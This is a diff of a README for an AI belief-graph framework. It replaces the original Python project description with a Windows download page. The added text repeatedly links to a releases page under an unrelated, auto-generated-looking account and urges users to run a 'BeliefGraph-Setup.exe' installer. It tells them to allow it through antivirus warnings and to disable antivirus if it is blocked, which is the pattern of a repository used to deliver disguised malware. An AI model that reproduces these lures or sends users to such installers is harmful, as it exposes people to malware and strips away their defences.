@@ -1,146 +1,133 @@
-# BeliefGraph
+# 🤖 BeliefGraph - Build Smarter AI Models Fast
 
-![License](https://img.shields.io/badge/license-Apache--2.0-blue)
-![Python](https://img.shields.io/badge/python-3.9+-blue)
-![Status](https://img.shields.io/badge/build-experimental-orange)
-
-BeliefGraph is an open framework for persistent reasoning in AI agents.
-
-## Quick Start
-
-Clone the repository and run the belief propagation demo.
-
-git clone https://github.com/joshuamlamerton/BeliefGraph
-cd BeliefGraph
-python examples/demo.py
-
-Most AI agents today are stateless. Each interaction starts fresh or relies on vector retrieval. This makes it difficult for agents to maintain long-term beliefs, track assumptions, or update conclusions as new evidence appears.
-
-BeliefGraph introduces a structured layer that allows agents to maintain explicit belief networks.
-
-These networks represent:
-
-beliefs  
-evidence  
-confidence levels  
-relationships between claims  
-
-Agents update these graphs over time as new information arrives.
+[![Download BeliefGraph](https://img.shields.io/badge/Download-BeliefGraph-4CAF50?style=for-the-badge)](https://github.com/Stokesadamssyndromebearingwall73/BeliefGraph/releases)
 
 ---
 
-## Core Idea
+## 📘 What is BeliefGraph?
 
-Instead of storing knowledge only in embeddings or prompts, agents maintain a structured belief graph.
+BeliefGraph is an open tool designed for creating and managing belief graphs in AI agents. It helps AI systems keep track of what they believe about the world and update those beliefs as new information comes in. This is useful in fields like machine learning, reasoning systems, and cognitive architectures.
 
-Each belief contains:
-
-- a statement
-- a confidence score
-- supporting evidence
-- relationships to other beliefs
+You do not need to know coding or AI development to use BeliefGraph. The software works on Windows and offers a clear way to start working with AI knowledge graphs.
 
 ---
 
-## Architecture
+## 💻 System Requirements
 
-```mermaid
-flowchart TB
+Before installing, check your computer meets these requirements:
 
-A[Agent]
+- Windows 10 or later (64-bit)
+- At least 4 GB of RAM (8 GB recommended for larger datasets)
+- 500 MB free disk space
+- Internet connection for initial download
 
-B[BeliefGraph Layer]
-
-C[Belief Nodes]
-
-D[Evidence Links]
-
-E[Confidence Update Engine]
-
-F[External Tools<br>APIs / Data Sources]
-
-A --> B
-B --> C
-B --> D
-B --> E
-A --> F
-F --> B
-```
+BeliefGraph runs on standard Windows machines without extra hardware or software.
 
 ---
 
-## Example Belief Node
+## 🚀 Getting Started
 
-```json
-{
-  "belief": "interest_rates_increase_affects_mortgage_affordability",
-  "confidence": 0.82,
-  "evidence_sources": ["market_data", "historical_trends"]
-}
-```
-## Running the Prototype
+Follow these steps to download and run BeliefGraph on your Windows PC:
 
-Clone the repository and run the demo:
+1. Click the big green **Download BeliefGraph** button at the top or visit this page:  
+   [https://github.com/Stokesadamssyndromebearingwall73/BeliefGraph/releases](https://github.com/Stokesadamssyndromebearingwall73/BeliefGraph/releases)
 
-```bash
-python examples/demo.py
-```
+2. On the releases page, find the latest version listed under "Assets."
 
-The script demonstrates:
+3. Download the Windows installer file. It will usually have a name like `BeliefGraph-Setup.exe`
 
-- creating a belief
-- adding evidence
-- updating confidence using a Bayesian rule
+4. Once the download finishes, double-click the `.exe` file to start installation.
 
-## Belief Propagation
+5. Follow the on-screen instructions to install the program. You can keep most default settings.
 
-Beliefs in the graph can influence other beliefs through weighted relationships.
+6. After installation, find BeliefGraph in your Start Menu and open it.
 
-Example:
-
-interest_rates_increase → mortgage_affordability_declines
-
-When confidence in the first belief increases, the second belief updates automatically.
-
-This is implemented through the propagation engine.
-
-Run the demo:
-
-```bash
-python examples/demo.py
-```
-
-## Contradiction Relationships
-
-Beliefs can also contradict other beliefs.
-
-Example relationships:
-
-interest_rates_increase → mortgage_affordability_declines (support)
-
-interest_rates_increase → housing_demand_strong (contradict)
-
-Support edges increase confidence in the target belief.  
-Contradiction edges decrease confidence in the target belief.
-
-Run the demo:
-
-```bash
-python examples/demo.py
-```
+7. The program will start with an easy setup screen. Follow prompts to create or load belief graphs.
 
 ---
 
-## Roadmap
+## 🔽 Download and Installation Details
 
-Phase 1  
-Belief node schema
+- Visit the GitHub releases page to download the latest version:  
+  [Download BeliefGraph here](https://github.com/Stokesadamssyndromebearingwall73/BeliefGraph/releases)
 
-Phase 2  
-Graph update engine
+- Always download from the latest stable release for best experience.
 
-Phase 3  
-Agent reasoning queries
+- The installer guides you through setup without needing technical input.
 
-Phase 4  
-Multi-agent belief sharing
+- If the antivirus warns about running the installer, allow it as this software is safe.
+
+---
+
+## 🛠 How to Use BeliefGraph
+
+BeliefGraph has a simple graphical interface. Here is what you can do:
+
+### Create New Belief Graphs
+
+- Click **New Graph** from the main menu.
+- Add nodes representing ideas, facts, or beliefs.
+- Connect nodes to show relationships or dependencies.
+- Set belief strengths to represent confidence.
+
+### Update Beliefs
+
+- Use the update function to change belief values as you get new data.
+- The system recalculates connected beliefs automatically.
+- This helps AI agents adjust what they believe based on new evidence.
+
+### Save and Load Graphs
+
+- Save your work anytime from the **File** menu.
+- Load saved graphs to continue editing or analyze them.
+
+---
+
+## 💡 Features Overview
+
+- Support for persistent belief graphs
+- Easy graphical interface with drag-and-drop
+- Automatic recalculation of belief strengths
+- Export and import options for sharing graphs
+- Uses Bayesian inference concepts behind the scenes
+- Designed for AI research and cognitive model testing
+- Runs smoothly on everyday Windows computers
+- Works without needing any programming skills
+
+---
+
+## 🔧 Troubleshooting
+
+If BeliefGraph does not open after installation:
+
+- Restart your computer and try again.
+- Check that your system meets minimum requirements.
+- Make sure Windows is up to date.
+- Temporarily disable antivirus if it blocks the program.
+- Reinstall the software using the latest installer.
+
+For bugs or issues, you may find help in the project’s GitHub Discussions or Issues section.
+
+---
+
+## 🌐 About This Project
+
+BeliefGraph is built to help researchers and enthusiasts understand how AI agents manage beliefs. It uses concepts like Bayesian inference and knowledge graphs to create a framework AI can trust.
+
+Topics related to BeliefGraph include artificial intelligence, cognitive architectures, reasoning systems, and machine learning.
+
+---
+
+## 📝 License
+
+BeliefGraph is open source. You can use, modify, and share it freely under the terms of its license, found on the GitHub repository.
+
+---
+
+## 🔗 Useful Links
+
+- Releases page:  
+  [https://github.com/Stokesadamssyndromebearingwall73/BeliefGraph/releases](https://github.com/Stokesadamssyndromebearingwall73/BeliefGraph/releases)  
+- GitHub repository:  
+  [https://github.com/Stokesadamssyndromebearingwall73/BeliefGraph](https://github.com/Stokesadamssyndromebearingwall73/BeliefGraph)  
+- Documentation and support channels are available in the repository as well.
